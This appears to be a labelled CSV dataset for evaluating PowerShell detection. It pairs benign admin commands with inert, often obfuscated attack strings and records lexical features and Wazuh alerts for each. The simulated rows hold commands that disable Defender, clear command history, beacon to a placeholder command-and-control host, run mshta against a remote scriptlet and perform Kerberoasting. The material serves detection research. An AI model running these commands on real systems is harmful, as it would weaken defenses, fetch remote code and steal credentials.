id,label,truth,class_id,dataset_group,scenario,behavior_family,evaluation_group,source_family,tactic,technique,mitre_attack_id,obfuscation_type,safety_class,lexical_input_source,scriptblock_event_id,scriptblock_event_sha256,analysis_text,lexical_score,lexical_reasons,wazuh_prediction,wazuh_alert_count,wazuh_rule_ids,wazuh_rule_levels,wazuh_max_rule_level,wazuh_rule_descriptions,feature_analysis_length,feature_line_count,feature_token_count,feature_special_char_count,feature_special_char_ratio,feature_digit_ratio,feature_whitespace_ratio,feature_entropy,feature_quoted_literal_count,feature_short_literal_count,feature_joined_literal_length,feature_base64_candidate_count,feature_longest_base64_candidate,feature_decoded_view_count,feature_backtick_count,feature_concat_operator_count,feature_join_operator_count,feature_format_operator_count,feature_char_cast_count,feature_suspicious_mixed_case_count,feature_suspicious_mixed_case_tokens,feature_execution_hit_count,feature_execution_hits,feature_raw_execution_hit_count,feature_recovered_execution_hit_count,feature_decoded_execution_hit_count,feature_download_hit_count,feature_download_hits,feature_raw_download_hit_count,feature_recovered_download_hit_count,feature_decoded_download_hit_count,feature_network_c2_hit_count,feature_network_c2_hits,feature_raw_network_c2_hit_count,feature_recovered_network_c2_hit_count,feature_decoded_network_c2_hit_count,feature_defense_evasion_hit_count,feature_defense_evasion_hits,feature_raw_defense_evasion_hit_count,feature_recovered_defense_evasion_hit_count,feature_decoded_defense_evasion_hit_count,feature_persistence_hit_count,feature_persistence_hits,feature_raw_persistence_hit_count,feature_recovered_persistence_hit_count,feature_decoded_persistence_hit_count,feature_credential_access_hit_count,feature_credential_access_hits,feature_raw_credential_access_hit_count,feature_recovered_credential_access_hit_count,feature_decoded_credential_access_hit_count,feature_lolbin_hit_count,feature_lolbin_hits,feature_raw_lolbin_hit_count,feature_recovered_lolbin_hit_count,feature_decoded_lolbin_hit_count,feature_collection_hit_count,feature_collection_hits,feature_raw_collection_hit_count,feature_recovered_collection_hit_count,feature_decoded_collection_hit_count,feature_remote_execution_hit_count,feature_remote_execution_hits,feature_raw_remote_execution_hit_count,feature_recovered_remote_execution_hit_count,feature_decoded_remote_execution_hit_count,feature_discovery_hit_count,feature_discovery_hits,feature_raw_discovery_hit_count,feature_recovered_discovery_hit_count,feature_decoded_discovery_hit_count,feature_indicator_category_count,feature_high_risk_category_count,feature_raw_indicator_hit_count,feature_indicator_hit_count,feature_recovered_indicator_hit_count,feature_decoded_indicator_hit_count,cv_fold,cv_threshold,lexical_prediction,deployment_threshold,lexical_prediction_full_fit,hybrid_or_prediction,hybrid_and_prediction,wazuh_level_3_prediction,wazuh_level_4_prediction,wazuh_level_5_prediction,wazuh_level_7_prediction,wazuh_level_10_prediction,wazuh_level_12_prediction
PST-222,simulated_malicious,1,1,obfuscated_indicator,screen_capture_string_concatenation,screen_capture,positive:screen_capture,Source-derived inert offensive behavior pattern,Collection,Screen Capture,T1113,string_concatenation,simulated_malicious_non_executable,windows_event_4104_scriptblocktext,c9460ba9-a550-45cc-8aef-fa21c8b284f5,5e1ca1213472e9ea04f72f7a7e788047ba4f4420044519b517a9db4b36b4ae8d,"$indicator='[System' + '.Drawi' + 'ng.Gra' + 'phics]::Fro' + 'mImage($b' + 'mp).Copy' + 'From' + 'Scree' + 'n(0,0,0,0,' + '$bmp.Siz' + 'e)'; Write-Output $indicator",7,+1:category_collection;+2:indicator_recovered_from_fragmentation;+1:string_reconstruction;+1:fragmented_literals;+2:combined_obfuscation,0,0,,,0,,164,1,21,55,0.335366,0.02439,0.134146,4.726165,11,11,76,0,0,0,0,10,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,copyfromscreen,0,1,0,0,,0,0,0,0,,0,0,0,1,0,0,1,1,0,0,4,1,5,1,1,0,0,0,0,0,0,0
PST-223,simulated_malicious,1,1,obfuscated_indicator,recursive_file_discovery_base64_literal_decode_safe,recursive_file_discovery,positive:recursive_file_discovery,Source-derived inert offensive behavior pattern,Discovery,File and Directory Discovery,T1083,base64_literal_decode_safe,simulated_malicious_non_executable,windows_event_4104_scriptblocktext,d7fa5f59-6e18-4809-bf6a-e9e5a5391a3d,0650388d4d2e6117d1be982e0ced5bff6d07301e7ad9d4bfed5d21f766e8a990,$encoded='RwBlAHQALQBDAGgAaQBsAGQASQB0AGUAbQAgACcAQwA6AFwAVQBzAGUAcgBzACcAIAAtAFIAZQBjAHUAcgBzAGUAIAAtAEYAbwByAGMAZQAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAUwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQA='; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator,11,+2:category_defense_evasion;+1:category_discovery;+2:indicator_recovered_from_base64;+2:indicator_recovered_from_fragmentation;+1:base64_candidate;+1:irregular_case;+2:combined_obfuscation,1,1,91809,10,10,Powershell script may be using Base64 decoding method,310,1,10,26,0.083871,0.022581,0.009677,5.092824,1,0,188,1,188,1,0,0,0,0,0,2,FromBase64String;RwBlAHQALQBDAGgAaQBsAGQASQB0AGUAbQAgACcAQwA6AFwAVQBzAGUAcgBzACcAIAAtAFIAZQBjAHUAcgBzAGUAIAAtAEYAbwByAGMAZQAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAUwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQA,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,frombase64string,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-childitem,0,1,1,2,1,1,2,1,1,1,5,1,5,1,1,1,1,1,1,1,1,0
PST-224,simulated_malicious,1,1,obfuscated_indicator,powershell_history_clear_combined_obfuscation,powershell_history_clear,positive:powershell_history_clear,Source-derived inert offensive behavior pattern,Defense Evasion,Clear Command History,T1070.003,combined_obfuscation,simulated_malicious_non_executable,windows_event_4104_scriptblocktext,c16c93a6-f9ff-4f1b-9753-8ac739c8d8c6,d43c630338d0df4eceb2fe57a6cf9ce7daefac98d285956cf3f3e3e278ebdce3,"$parts=@('ClEAR','-hIsT`','ORy; re','mOve-iT','eM (GeT-PSR','EaDLine','optiON).','his`To','RySav`epAT','H -FOrce'); $indicator=($parts -join ''); Write-Output $indicator",5,+1:backtick_obfuscation;+1:string_reconstruction;+1:fragmented_literals;+2:combined_obfuscation,0,0,,,0,,169,1,22,57,0.337278,0.0,0.047337,5.017802,11,10,75,0,0,0,3,0,1,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0,4,6,0,5,1,0,0,0,0,0,0,0,0
PST-225,benign,0,0,normal_benign,net_adapter_normal_v1,net_adapter_normal,benign:net_adapter_normal,Microsoft PowerShell administrative examples,Benign Administration,Legitimate PowerShell administration,N/A,none,benign_safe_execution,windows_event_4104_scriptblocktext,7dbbce09-acec-4569-a1d3-8c829d982c52,eb03688636b43626edcf7640e7e1e711a24febe0e25ca6e003502e4915be84d1,"Get-NetAdapter | Select-Object -First 5 Name, Status, MacAddress",1,+1:irregular_case,0,0,,,0,,64,1,7,6,0.09375,0.015625,0.109375,4.270765,0,0,0,0,0,0,0,0,0,0,0,1,Get-NetAdapter,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0,0,4,0,5,0,0,0,0,0,0,0,0,0
PST-226,benign,0,0,hard_benign,hard_internal_url_output_v2,hard_internal_url_output,benign:hard_internal_url_output,Microsoft PowerShell administrative examples,Benign Administration,Legitimate PowerShell administration,N/A,none,benign_safe_execution,windows_event_4104_scriptblocktext,62c98a94-aa00-4a22-a07b-bacd371301a3,c706b5855595e9d2bcde97eee380c655f5a58df06189557eaf1579927ac569f6,$uri = 'https://intranet.example.local/status/api/v1/health?format=json'; Write-Output $uri; Write-Output 'hard benign variant 2',1,+1:base64_candidate,0,0,,,0,,129,1,16,22,0.170543,0.015504,0.069767,4.646584,2,0,84,1,26,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0,1,5,0,5,0,0,0,0,0,0,0,0,0
PST-227,simulated_malicious,1,1,obfuscated_indicator,http_beacon_profile_backtick_literal,http_beacon_profile,positive:http_beacon_profile,Source-derived inert offensive behavior pattern,Command and Control,Web Protocols,T1071.001,backtick_literal,simulated_malicious_non_executable,windows_event_4104_scriptblocktext,ef93e106-dc88-4924-82d2-07033a6b8693,d3ca7abd30fac2217bf08d576e8c71529a385fb37bd68cfd3311ab0616be5868,$indicator='$profi`le=@{Sleep=60000;Jit`ter=0.25;Us`erAgent=''Mozil`la/5.0'';Uri=''/api/v1/sta`tus''}; Invo`ke-We`bRequest -Uri ''https://c2.ex`ample.inva`lid/api/v1/stat`us'''; Write-Output $indicator,7,+2:category_download;+2:category_network_c2;+2:multiple_high_risk_categories;+1:backtick_obfuscation,0,0,,,0,,201,1,32,58,0.288557,0.064677,0.024876,5.067729,1,0,157,0,0,0,10,0,0,0,0,0,,0,,0,0,0,1,invoke-webrequest,1,0,0,1,jitter,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,2,2,0,0,0,4,1,5,1,1,0,0,0,0,0,0,0
PST-228,benign,0,0,normal_benign,dns_client_cache_normal_v2,dns_client_cache_normal,benign:dns_client_cache_normal,Microsoft PowerShell administrative examples,Benign Administration,Legitimate PowerShell administration,N/A,none,benign_safe_execution,windows_event_4104_scriptblocktext,689e7bd2-cada-4053-aec9-fc1351235405,3513ef4403c9d491de4f00358a798c77486b41fffb8fbb38a6c6bb4bce9db1e1,"Get-DnsClientCache -ErrorAction SilentlyContinue | Select-Object -First 5 Entry, Data; Write-Output 'benign variant 2'",1,+1:irregular_case,0,0,,,0,,118,1,12,10,0.084746,0.016949,0.101695,4.544537,1,1,16,0,0,0,0,0,0,0,0,1,Get-DnsClientCache,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0,4,6,0,5,0,0,0,0,0,0,0,0,0
PST-229,benign,0,0,hard_benign,hard_localhost_url_string_v1,hard_localhost_url_string,benign:hard_localhost_url_string,Microsoft PowerShell administrative examples,Benign Administration,Legitimate PowerShell administration,N/A,none,benign_safe_execution,windows_event_4104_scriptblocktext,178f00df-1d2c-47b4-aeaa-e27acbea8613,a993cf32b038860930058a587c39f46acf04f3956d0b2558b315dd09b6c0e28d,$url = 'http://localhost:8080/healthz?component=agent&format=text'; Write-Output $url,0,,0,0,,,0,,85,1,11,16,0.188235,0.047059,0.047059,4.634473,1,0,57,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0,4,6,0,5,0,0,0,0,0,0,0,0,0
PST-230,simulated_malicious,1,1,clear_indicator,defender_exclusion_clear,defender_exclusion,positive:defender_exclusion,Source-derived inert offensive behavior pattern,Defense Evasion,Impair Defenses,T1562.001,none,simulated_malicious_non_executable,windows_event_4104_scriptblocktext,ee27b816-b0e5-4424-b9a9-2536f58e9036,7094afb05776b53e9c7061e3a9f3453cc2c844c0937358e11377b5f1a4117c91,$indicator='Set-MpPreference -ExclusionPath ''C:\__THESIS_INERT__'' -DisableRealtimeMonitoring $true'; Write-Output $indicator,6,+2:category_defense_evasion;+1:base64_candidate;+1:irregular_case;+2:combined_obfuscation,0,0,,,0,,126,1,9,22,0.174603,0.0,0.047619,4.916271,1,0,86,1,25,0,0,0,0,0,0,1,Set-MpPreference,0,,0,0,0,0,,0,0,0,0,,0,0,0,3,disableRealtimeMonitoring;exclusionpath;set-mppreference,3,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,3,3,0,0,3,4,1,5,1,1,0,0,0,0,0,0,0
PST-231,benign,0,0,hard_benign,hard_defender_read_wording_v2,hard_defender_read_wording,benign:hard_defender_read_wording,Microsoft PowerShell administrative examples,Benign Administration,Legitimate PowerShell administration,N/A,none,benign_safe_execution,windows_event_4104_scriptblocktext,ec86409f-ce72-435b-a624-b99d9b368380,e37cb4305c76b5305acd0991497208138bc0d8c4e2c64ed117093928392d19e3,$settingText = 'Defender monitoring status read-only review'; Write-Output $settingText; Get-MpComputerStatus -ErrorAction SilentlyContinue | Select-Object AMServiceEnabled; Write-Output 'hard benign variant 2',1,+1:irregular_case,0,0,,,0,,210,1,18,17,0.080952,0.004762,0.090476,4.669413,2,0,64,0,0,0,0,0,0,0,0,1,Get-MpComputerStatus,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0,4,6,0,5,0,0,0,0,0,0,0,0,0
PST-232,benign,0,0,normal_benign,printer_inventory_normal_v2,printer_inventory_normal,benign:printer_inventory_normal,Microsoft PowerShell administrative examples,Benign Administration,Legitimate PowerShell administration,N/A,none,benign_safe_execution,windows_event_4104_scriptblocktext,624e1e78-1348-469b-a37e-c7a1cbc2a814,95ab760337b58cc0944e42d472dbb1f936739afb9774746e81ea24ebfc570ecb,"Get-Printer -ErrorAction SilentlyContinue | Select-Object -First 5 Name, DriverName; Write-Output 'benign variant 2'",0,,0,0,,,0,,116,1,12,10,0.086207,0.017241,0.103448,4.552494,1,1,16,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0,0,4,0,5,0,0,0,0,0,0,0,0,0
PST-233,benign,0,0,normal_benign,host_info_normal_v2,host_info_normal,benign:host_info_normal,Microsoft PowerShell administrative examples,Benign Administration,Legitimate PowerShell administration,N/A,none,benign_safe_execution,windows_event_4104_scriptblocktext,5c285810-8c3e-4403-abb5-adb211fee028,0b1f76cb3e8e4156919529053e4326f1ad0a3a46f150cb93f8a4ba4d9526dda7,Write-Host ('Host: ' + $env:COMPUTERNAME + '; User: ' + $env:USERNAME); Write-Output 'benign variant 2',2,+1:category_remote_execution;+1:string_reconstruction,1,1,91816,4,4,Powershell script querying system environment variables,103,1,11,21,0.203883,0.009709,0.135922,4.78982,3,3,30,0,0,0,0,3,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,computername,1,0,0,0,,0,0,0,1,1,1,1,0,0,3,4,0,5,0,1,0,1,1,0,0,0,0
PST-234,simulated_malicious,1,1,obfuscated_indicator,kerberoast_indicator_base64_literal_decode_safe,kerberoast_indicator,positive:kerberoast_indicator,Source-derived inert offensive behavior pattern,Credential Access,Kerberoasting,T1558.003,base64_literal_decode_safe,simulated_malicious_non_executable,windows_event_4104_scriptblocktext,d1976d6d-1080-4999-ad1f-accee06ace24,5fae44c2225ac16d42aeb030953a610b9d5983aaa7d9a7cf4d7feaafacfac357,$encoded='SQBuAHYAbwBrAGUALQBLAGUAcgBiAGUAcgBvAGEAcwB0ACAALQBPAHUAdABwAHUAdABGAG8AcgBtAGEAdAAgAEgAYQBzAGgAYwBhAHQAIAB8ACAAUwBlAGwAZQBjAHQALQBPAGIAagBlAGMAdAAgAFMAYQBtAEEAYwBjAG8AdQBuAHQATgBhAG0AZQAsAEgAYQBzAGgA'; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator,14,+2:category_defense_evasion;+2:category_credential_access;+2:multiple_high_risk_categories;+2:indicator_recovered_from_base64;+2:indicator_recovered_from_fragmentation;+1:base64_candidate;+1:irregular_case;+2:combined_obfuscation,1,1,91809,10,10,Powershell script may be using Base64 decoding method,322,1,10,25,0.07764,0.021739,0.009317,4.972335,1,0,200,1,200,1,0,0,0,0,0,2,FromBase64String;SQBuAHYAbwBrAGUALQBLAGUAcgBiAGUAcgBvAGEAcwB0ACAALQBPAHUAdABwAHUAdABGAG8AcgBtAGEAdAAgAEgAYQBzAGgAYwBhAHQAIAB8ACAAUwBlAGwAZQBjAHQALQBPAGIAagBlAGMAdAAgAFMAYQBtAEEAYwBjAG8AdQBuAHQATgBhAG0AZQAsAEgAYQBzAGgA,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,frombase64string,1,0,0,0,,0,0,0,3,invoke-kerberoast;outputformat hashcat;samaccountname,0,3,3,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,1,4,3,3,1,5,1,5,1,1,1,1,1,1,1,1,0
PST-235,benign,0,0,hard_benign,hard_firewall_read_filter_v2,hard_firewall_read_filter,benign:hard_firewall_read_filter,Microsoft PowerShell administrative examples,Benign Administration,Legitimate PowerShell administration,N/A,none,benign_safe_execution,windows_event_4104_scriptblocktext,470b5d33-388c-47e5-b3de-01a240faa562,2fd32ee2ac9ad2f6bb7c761b1af47fe5a8c2b499796a19ea4a35470b62c3dfc1,"Get-NetFirewallRule -ErrorAction SilentlyContinue | Where-Object Enabled -eq 'True' | Select-Object -First 5 DisplayName, Direction; Write-Output 'hard benign variant 2'",1,+1:irregular_case,0,0,,,0,,169,1,17,15,0.088757,0.011834,0.106509,4.708653,2,1,25,0,0,0,0,0,0,0,0,1,Get-NetFirewallRule,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0,0,4,0,5,0,0,0,0,0,0,0,0,0
PST-236,benign,0,0,hard_benign,hard_long_admin_string_v1,hard_long_admin_string,benign:hard_long_admin_string,Microsoft PowerShell administrative examples,Benign Administration,Legitimate PowerShell administration,N/A,none,benign_safe_execution,windows_event_4104_scriptblocktext,ba5ab3ec-bb53-4377-b216-389c115a38a2,d1c87fa4b2fa56e81a4b5b7d80f07103daa8e28fb416025c5fe835b7a7331b6e,$note = ('administrative inventory and compliance audit ' * 18); Write-Output $note,0,,0,0,,,0,,83,1,9,10,0.120482,0.024096,0.13253,4.359737,1,0,46,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0,2,3,0,5,0,0,0,0,0,0,0,0,0
PST-237,benign,0,0,normal_benign,psversion_normal_v2,psversion_normal,benign:psversion_normal,Microsoft PowerShell administrative examples,Benign Administration,Legitimate PowerShell administration,N/A,none,benign_safe_execution,windows_event_4104_scriptblocktext,93bfd346-2ff7-44c0-9cb7-0febd2843b26,1aa5a7ca550cd004d9d71ce5d075d4a65a3b393e4ac08ecc562904da5199a5b5,"$PSVersionTable | Select-Object PSVersion, PSEdition; Write-Output 'benign variant 2'",0,,0,0,,,0,,85,1,8,8,0.094118,0.011765,0.094118,4.599599,1,1,16,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0,3,4,0,5,0,0,0,0,0,0,0,0,0
PST-238,simulated_malicious,1,1,obfuscated_indicator,mshta_proxy_execution_backtick_literal,mshta_proxy_execution,positive:mshta_proxy_execution,Source-derived inert offensive behavior pattern,Defense Evasion,Mshta,T1218.005,backtick_literal,simulated_malicious_non_executable,windows_event_4104_scriptblocktext,f9d16cf3-ee04-49e0-8dfa-9505730ad82b,19a982c7478f31588f21ab678538ab1984a89d6ab6d951354370aef1e82eedf9,$indicator='mshta.exe jav`ascript:a=GetObject(''sc`ript:https://hta.ex`ample.inval`id/a.sct'').Exec();close()'; Write-Output $indicator,3,+2:category_lolbin;+1:backtick_obfuscation,0,0,,,0,,135,1,17,34,0.251852,0.0,0.022222,4.782496,1,0,95,0,0,0,4,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,mshta,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,1,0,0,0,4,0,5,0,0,0,0,0,0,0,0,0
PST-239,benign,0,0,hard_benign,hard_benign_base64_decode_config_v2,hard_benign_base64_decode_config,benign:hard_benign_base64_decode_config,Microsoft PowerShell administrative examples,Benign Administration,Legitimate PowerShell administration,N/A,none,benign_safe_execution,windows_event_4104_scriptblocktext,2a49b10b-1599-4264-9aa5-d43e731705b6,93283162b3a9d31e5bc6b5b9ea5e80d98a1d7e6084746499ece5266663e8e258,$b = 'VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAHQAZQBzAHQAIABvAG4AbAB5ACcA'; [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($b)); Write-Output 'hard benign variant 2',6,+2:category_defense_evasion;+1:base64_candidate;+1:irregular_case;+2:combined_obfuscation,1,1,91809,10,10,Powershell script may be using Base64 decoding method,178,1,12,24,0.134831,0.044944,0.044944,5.269639,2,0,85,1,64,1,0,0,0,0,0,2,FromBase64String;VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAHQAZQBzAHQAIABvAG4AbAB5ACcA,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,frombase64string,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,1,0,0,1,5,1,5,1,1,1,1,1,1,1,1,0
PST-240,benign,0,0,hard_benign,hard_admin_text_with_password_word_v2,hard_admin_text_with_password_word,benign:hard_admin_text_with_password_word,Microsoft PowerShell administrative examples,Benign Administration,Legitimate PowerShell administration,N/A,none,benign_safe_execution,windows_event_4104_scriptblocktext,eb27f89b-3b4b-4baa-8c55-fd2d40c234a3,52f00524f5d2327bfe470418f7163d16ac8a438dec0070c770a1b68eaad238c4,"$audit = 'credential policy review: password age setting checked, no password value stored'; Write-Output $audit; Write-Output 'hard benign variant 2'",2,+2:category_credential_access,0,0,,,0,,150,1,19,13,0.086667,0.006667,0.126667,4.450153,2,0,101,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,credential;password,2,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,2,2,0,0,3,4,0,5,0,0,0,0,0,0,0,0,0
PST-241,benign,0,0,normal_benign,tcp_connection_normal_v2,tcp_connection_normal,benign:tcp_connection_normal,Microsoft PowerShell administrative examples,Benign Administration,Legitimate PowerShell administration,N/A,none,benign_safe_execution,windows_event_4104_scriptblocktext,410ec2f5-f74f-49fd-a6dd-397751eb03e2,16afea699b6674fb439251f2258d977aeae8acd56f4ec3afd5a3e3bb6cc02544,"Get-NetTCPConnection -State Established -ErrorAction SilentlyContinue | Select-Object -First 5 LocalAddress, RemoteAddress, State; Write-Output 'benign variant 2'",0,,0,0,,,0,,162,1,15,12,0.074074,0.012346,0.092593,4.65639,1,1,16,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0,1,5,0,5,0,0,0,0,0,0,0,0,0
PST-242,benign,0,0,normal_benign,os_inventory_normal_v2,os_inventory_normal,benign:os_inventory_normal,Microsoft PowerShell administrative examples,Benign Administration,Legitimate PowerShell administration,N/A,none,benign_safe_execution,windows_event_4104_scriptblocktext,c9fba75e-4259-4730-af86-b79b7d78ac7c,38883bcb71e45d0babc191a59d32da6ee0008fafdca914bf0a28ec55e6d91e2d,"Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version, BuildNumber; Write-Output 'benign variant 2'",1,+1:irregular_case,0,0,,,0,,116,1,10,10,0.086207,0.025862,0.086207,4.712387,1,1,16,0,0,0,0,0,0,0,0,1,Get-CimInstance,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0,1,5,0,5,0,0,0,0,0,0,0,0,0
PST-243,benign,0,0,hard_benign,hard_uri_object_create_v2,hard_uri_object_create,benign:hard_uri_object_create,Microsoft PowerShell administrative examples,Benign Administration,Legitimate PowerShell administration,N/A,none,benign_safe_execution,windows_event_4104_scriptblocktext,1a75b3e1-1ac3-4abd-b3e5-767d90e22a09,768bdc18036bf8e5c34f10c7c468ebe1b015d6fe9a6669551070982e71a82198,$u = [Uri]'https://intranet.example.local/monitoring/check?id=42'; Write-Output $u.Host; Write-Output 'hard benign variant 2',0,,0,0,,,0,,125,1,15,23,0.184,0.024,0.072,4.820521,2,0,74,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0,3,4,0,5,0,0,0,0,0,0,0,0,0
PST-244,benign,0,0,hard_benign,hard_xml_processing_v1,hard_xml_processing,benign:hard_xml_processing,Microsoft PowerShell administrative examples,Benign Administration,Legitimate PowerShell administration,N/A,none,benign_safe_execution,windows_event_4104_scriptblocktext,6d437857-fb91-4810-8f9d-0456cfc02384,4b7417626892a9108721f8ca06b8e2c783c5a4d63adabdcf04725244b073a291,"[xml]$xml = '<inventory><host name=""ws-01""><state>ok</state></host></inventory>'; $xml.inventory.host.state",0,,0,0,,,0,,107,1,12,30,0.280374,0.018692,0.037383,4.615869,1,0,66,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0,3,4,0,5,0,0,0,0,0,0,0,0,0
